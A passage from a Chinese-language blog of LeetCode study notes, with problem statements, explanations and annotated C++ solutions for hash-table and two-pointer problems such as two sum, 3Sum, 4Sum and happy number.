class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">groupAnagrams</span>(vector&lt;string&gt;&amp; strs) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = strs.<span class="built_in">size</span>();<span class="comment">//共有n个字符串</span></span><br><span class="line">        unordered_map&lt;string, vector&lt;string&gt;&gt; maap;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            string s = strs[i];<span class="comment">//字符串</span></span><br><span class="line">            <span class="built_in">sort</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">end</span>());</span><br><span class="line">            maap[s].<span class="built_in">push_back</span>(strs[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;string&gt;&gt; ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> it=maap.<span class="built_in">begin</span>();it!=maap.<span class="built_in">end</span>();it++)</span><br><span class="line">            ans.<span class="built_in">push_back</span>(it-&gt;second);</span><br><span class="line">            <span class="comment">//first获取key，second获取value</span></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="438-找到字符串中所有字母异位词——滑动窗口"><a href="#438-找到字符串中所有字母异位词——滑动窗口" class="headerlink" title="438 找到字符串中所有字母异位词——滑动窗口"></a>438 找到字符串中所有字母异位词——滑动窗口</h3><p>给定两个字符串 s 和 p，找到 s 中所有 p 的 异位词 的<strong>子串</strong>，返回这些子串的起始索引。不考虑答案输出的顺序。<br>异位词 指由相同字母重排列形成的字符串（包括相同的字符串）。</p><h3 id="349-两个数组的交集"><a href="#349-两个数组的交集" class="headerlink" title="349 两个数组的交集"></a>349 两个数组的交集</h3><p>给定两个数组 nums1 和 nums2 ，返回 它们的 <strong>交集</strong> 。输出结果中的每个元素一定是 唯一 的。我们可以 不考虑输出结果的顺序。<br>注：使用数组来做哈希的题目，是因为题目都限制了数值的大小</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表O(m+n)</span></span><br><span class="line"><span class="comment">    将两个数组 分别装入unordered_set中</span></span><br><span class="line"><span class="comment">    利用set中count()函数判断</span></span><br><span class="line"><span class="comment">    遍历【短的set1】，看其每个元素是否在【长的set2中】，在的话将该元素插入集合</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">getIntersection</span><span class="params">(unordered_set&lt;<span class="keyword">int</span>&gt;&amp; set1,unordered_set&lt;<span class="keyword">int</span>&gt;&amp; set2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(set1.<span class="built_in">size</span>()&gt;set2.<span class="built_in">size</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getIntersection</span>(set2,set1);</span><br><span class="line">        <span class="comment">//保证 set1小，set2大</span></span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; intersection;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; num:set1)&#123;</span><br><span class="line">            <span class="keyword">if</span>(set2.<span class="built_in">count</span>(num))</span><br><span class="line">                intersection.<span class="built_in">push_back</span>(num);<span class="comment">//不要求顺序</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intersection;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">intersection</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; set1,set2;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; num:nums1)&#123;</span><br><span class="line">            set1.<span class="built_in">insert</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; num:nums2)&#123;</span><br><span class="line">            set2.<span class="built_in">insert</span>(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getIntersection</span>(set1,set2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h3><p>给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中<strong>找出 和为目标值 target 的那两个整</strong>数，并返回它们的<strong>数组下标</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    暴力 O(n^2)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;len;j++)&#123;<span class="comment">//j=i+1</span></span><br><span class="line">                <span class="keyword">if</span>(nums[i]+nums[j]==target)&#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;i,j&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>哈希表：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表 O(n)     unordered_map&lt;int,int&gt; maap;</span></span><br><span class="line"><span class="comment">    map中的存储结构为 &#123;key：元素值，value：元素下标&#125;</span></span><br><span class="line"><span class="comment">    获取下标：auto it = maap.find(target-nums[i]);</span></span><br><span class="line"><span class="comment">            if(it != maap.end())</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">auto</span> it = maap.<span class="built_in">find</span>(target-nums[i]);</span><br><span class="line">            <span class="keyword">if</span>(it != maap.<span class="built_in">end</span>())<span class="comment">//找到了某个值 </span></span><br><span class="line">                <span class="keyword">return</span> &#123;it-&gt;second,i&#125;;</span><br><span class="line">            maap[nums[i]] = i;<span class="comment">//存入表中</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="202-快乐数"><a href="#202-快乐数" class="headerlink" title="202 快乐数"></a>202 快乐数</h3><p>编写一个算法来判断一个数 n 是不是快乐数。</p><p><strong>「快乐数」</strong>：对于一个正整数，每一次<strong>将该数替换为它每个位置上的数字的平方和</strong>，然后重复这个过程直到这个数变为 1，也可能是 无限循环 但始终变不到 1。如果 可以变为  1，那么这个数就是快乐数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  unordered_set&lt;int&gt; set; 判断某数曾经是否出现过</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 取数值各个位 平方 之和</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getSum</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n) &#123;</span><br><span class="line">            sum += (n % <span class="number">10</span>) * (n % <span class="number">10</span>);</span><br><span class="line">            n /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isHappy</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; set;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="built_in">getSum</span>(n);</span><br><span class="line">            <span class="keyword">if</span> (sum == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 判断这个sum曾经是否出现过</span></span><br><span class="line">            <span class="keyword">if</span> (set.<span class="built_in">find</span>(sum) != set.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            <span class="comment">//if(set.count(sum))</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                set.<span class="built_in">insert</span>(sum);<span class="comment">//否则插入</span></span><br><span class="line">            &#125;</span><br><span class="line">            n = sum;<span class="comment">//更新 n,用 sum 替换</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="454-四数相加-II——可重复，-0"><a href="#454-四数相加-II——可重复，-0" class="headerlink" title="454 四数相加 II——可重复，==0"></a>454 四数相加 II——可重复，==0</h3><p>给你四个整数数组 nums1、nums2、nums3 和 nums4 ，数组长度都是 n ，请你计算有<code>多少个元组</code> (i, j, k, l) 能满足：</p><ul><li>0 &lt;= i, j, k, l &lt; n</li><li>nums1[i] + nums2[j] + nums3[k] + nums4[l] == 0</li></ul><p><strong>分析：</strong><br>四个独立的数组，只要找到A[i] + B[j] + C[k] + D[l] = 0就可以，不用考虑有重复的四个元素相加等于0的情况，相对于题目18. 四数之和，题目15.三数之和，简单了不少！</p><p><strong>解题步骤：</strong></p><ul><li>首先定义 一个unordered_map，key放a和b两数之和，value 放a和b两数之和出现的次数。</li><li>遍历大A和大B数组，统计两个数组元素之和，和出现的次数，放到map中。</li><li>定义int变量count，用来统计 a+b+c+d = 0 出现的次数。</li><li>在遍历大C和大D数组，找到如果 0-(c+d) 在map中出现过的话，就用count把map中key对应的value也就是出现次数统计出来。</li><li>最后返回统计值 count<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    unordered_map&lt;int, int&gt; umap;</span></span><br><span class="line"><span class="comment">    key：a和b两数之和   value：a和b两数之和出现的次数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">fourSumCount</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; A, vector&lt;<span class="keyword">int</span>&gt;&amp; B, vector&lt;<span class="keyword">int</span>&gt;&amp; C, vector&lt;<span class="keyword">int</span>&gt;&amp; D)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; umap; </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> a : A) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> b : B) &#123;</span><br><span class="line">                umap[a + b]++;<span class="comment">//a+b之和：次数</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> c : C) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> d : D) &#123;</span><br><span class="line">                <span class="keyword">if</span> (umap.<span class="built_in">find</span>(<span class="number">0</span>-(c + d)) != umap.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                    count += umap[<span class="number">0</span>-(c + d)];<span class="comment">//四数之和</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="15-三数之和——不能重复，-0"><a href="#15-三数之和——不能重复，-0" class="headerlink" title="15 三数之和——不能重复，==0"></a>15 三数之和——不能重复，==0</h3>给你<strong>一个整数数组 nums</strong> ，判断是否存在三元组 [nums[i], nums[j], nums[k]] 满足 <strong>i != j、i != k 且 j != k</strong>【<strong>不能重复</strong>】 ，同时还满足 nums[i] + nums[j] + nums[k] == 0 。</li><li>返回所有和为 0 且<strong>不重复</strong>的三元组。</li></ul><p><strong>难点：</strong><br>两层for循环就可以确定 a和b 的数值了，可以使用哈希法来确定 0-(a+b) 是否在 数组里出现过，这个思路是正确的，但是非常棘手的问题，就是题目中说的<code>不可以包含重复的三元组</code>。<br>并且，<br>把符合条件的三元组放进vector中，再去重，非常费时。<br><img src="https://img-blog.csdnimg.cn/2b801a963f644f288616dc09f0b0219e.png"><br><img src="https://img-blog.csdnimg.cn/309d876961324d2cb4dbdc48a99cb2e7.png"><br><a href="https://programmercarl.com/0015.%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C.html#%E5%8E%BB%E9%87%8D%E9%80%BB%E8%BE%91%E7%9A%84%E6%80%9D%E8%80%83">https://programmercarl.com/0015.%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C.html#%E5%8E%BB%E9%87%8D%E9%80%BB%E8%BE%91%E7%9A%84%E6%80%9D%E8%80%83</a></p><p><strong>注意：</strong><br>两数之和 就不能使用双指针法，因为1.两数之和要求返回的是<strong>索引下标</strong>， 而<strong>双指针法一定要排序，一旦排序之后原数组的索引就被改变了</strong>。<br>如果1.两数之和要求返回的是数值的话，就可以使用双指针法了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    排序+双指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">threeSum</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());<span class="comment">//升序排序</span></span><br><span class="line">        <span class="comment">// 找出a + b + c = 0</span></span><br><span class="line">        <span class="comment">// a = nums[i], b = nums[left], c = nums[right]</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="comment">// 排序之后如果第一个元素已经大于零，那么无论如何组合都不可能凑成三元组，直接返回结果就可以了</span></span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 正确去重a方法 记得i&gt;0</span></span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> left = i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> right = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (right &gt; left) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] + nums[left] + nums[right] &gt; <span class="number">0</span>) </span><br><span class="line">                    right--;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] + nums[left] + nums[right] &lt; <span class="number">0</span>) </span><br><span class="line">                    left++;</span><br><span class="line">                <span class="keyword">else</span> &#123;<span class="comment">//==0</span></span><br><span class="line">                    result.<span class="built_in">push_back</span>(vector&lt;<span class="keyword">int</span>&gt;&#123;nums[i], nums[left], nums[right]&#125;);</span><br><span class="line">                    <span class="comment">// 去重逻辑应该放在找到一个三元组之后，对b 和 c去重</span></span><br><span class="line">                    <span class="keyword">while</span> (right &gt; left &amp;&amp; nums[right] == nums[right - <span class="number">1</span>]) right--;</span><br><span class="line">                    <span class="keyword">while</span> (right &gt; left &amp;&amp; nums[left] == nums[left + <span class="number">1</span>]) left++;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 找到答案时，双指针同时收缩</span></span><br><span class="line">                    right--;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="18-四数之和——不能重复，-target"><a href="#18-四数之和——不能重复，-target" class="headerlink" title="18 四数之和——不能重复，==target"></a>18 四数之和——不能重复，==target</h3><p>给你<strong>一个由 n 个整数组成的数组 nums</strong> ，和一个目标值 target 。请你找出并返回满足下述全部条件且<strong>不重复</strong>的四元组 [ nums[a], nums[b], nums[c], nums[d] ] </p><ul><li>0 &lt;= a, b, c, d &lt; n</li><li>a、b、c 和 d 互不相同</li><li>nums[a] + nums[b] + nums[c] + nums[d] == target<br>可按 任意顺序 返回答案。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//O(n^3)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">fourSum</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());<span class="comment">//排序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; nums.<span class="built_in">size</span>(); k++) &#123;</span><br><span class="line">            <span class="comment">// 剪枝处理  nums[k] &gt; target</span></span><br><span class="line">            <span class="keyword">if</span> (nums[k] &gt; target &amp;&amp; nums[k] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 这里使用break，统一通过最后的return返回</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 对nums[k]去重</span></span><br><span class="line">            <span class="keyword">if</span> (k &gt; <span class="number">0</span> &amp;&amp; nums[k] == nums[k - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = k + <span class="number">1</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">                <span class="comment">// 2级剪枝处理</span></span><br><span class="line">                <span class="keyword">if</span> (nums[k] + nums[i] &gt; target &amp;&amp; nums[k] + nums[i] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 对nums[i]去重</span></span><br><span class="line">                <span class="keyword">if</span> (i &gt; k + <span class="number">1</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) </span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">int</span> left = i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">int</span> right = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span> (right &gt; left) &#123;</span><br><span class="line">                    <span class="comment">// nums[k] + nums[i] + nums[left] + nums[right] &gt; target 会溢出</span></span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">long</span>) nums[k] + nums[i] + nums[left] + nums[right] &gt; target) &#123;</span><br><span class="line">                        right--;</span><br><span class="line">                    <span class="comment">// nums[k] + nums[i] + nums[left] + nums[right] &lt; target 会溢出</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="keyword">long</span>) nums[k] + nums[i] + nums[left] + nums[right]  &lt; target) &#123;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        result.<span class="built_in">push_back</span>(vector&lt;<span class="keyword">int</span>&gt;&#123;nums[k], nums[i], nums[left], nums[right]&#125;);</span><br><span class="line">                        <span class="comment">// 对nums[left]和nums[right]去重</span></span><br><span class="line">                        <span class="keyword">while</span> (right &gt; left &amp;&amp; nums[right] == nums[right - <span class="number">1</span>]) right--;</span><br><span class="line">                        <span class="keyword">while</span> (right &gt; left &amp;&amp; nums[left] == nums[left + <span class="number">1</span>]) left++;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 找到答案时，双指针同时收缩</span></span><br><span class="line">                        right--;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="594-最长和谐子序列——数字差是1，返回长度"><a href="#594-最长和谐子序列——数字差是1，返回长度" class="headerlink" title="594 最长和谐子序列——数字差是1，返回长度"></a>594 最长和谐子序列——数字差是1，返回长度</h3></li></ul><p><strong>和谐数组</strong>：指一个数组里元素的【最大值和最小值之间的差别 正好是1】。<br>给你一个整数数组 nums ，请你在所有可能的子序列中<strong>找到最长的和谐子序列的长度</strong>。<br><strong>数组的子序列</strong>：是一个由数组派生出来的序列，它可以通过删除一些元素或不删除元素、且不改变其余元素的顺序而得到。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    枚举 O(NlogN)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findLHS</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());<span class="comment">//从小到大排序</span></span><br><span class="line">        <span class="keyword">int</span> begin = <span class="number">0</span>;<span class="comment">//指向第一个连续相同元素的子序列的【第一个元素】</span></span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//指向相邻的第二个连续相同元素的子序列的【末尾元素】</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> end=<span class="number">0</span>;end&lt;nums.<span class="built_in">size</span>(); end++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(nums[end] - nums[begin] 